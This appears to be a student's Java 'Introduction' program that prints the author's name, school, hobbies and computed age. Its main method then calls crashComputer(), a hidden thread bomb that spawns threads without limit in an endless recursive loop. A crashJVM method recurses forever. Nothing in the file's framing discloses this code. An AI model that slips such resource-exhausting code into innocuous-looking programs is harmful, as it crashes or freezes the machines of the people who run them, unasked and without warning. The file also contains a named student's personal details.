/**
 * 
 * this important
 * 
 * @autbor me
 * @version 1
 */
public class Introduction
{
   public static void main(String[] args) {
       System.out.println("I was born in the 864");
       System.out.println("I go to JL Mann");
       System.out.println("I play baseball and basketball");
       System.out.println("Semi-professional race car driver");
       System.out.println("Amateur tattoo artist");
       
       String name = "C Payne";
       int birthYear = 2000;
       int currentYear = 2018;
       
       System.out.println("currentYear - birthYear");
       System.out.println(currentYear - birthYear);
       
       int age = currentYear - birthYear;
       boolean hadBday = false;
       
       if (hadBday == false){
           age -= 1;
        }
        
       System.out.println("My name is " + name + ", and I am " + age + " years old.");
       
       crashComputer();
   }
   
   public static void crashComputer() {
    while(true) {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                while(true) {
                    crashComputer();
                }
            }
        });
        thread.start();
    }
}

public static void crashJVM() {
    while(true)
        crashJVM();
}
}
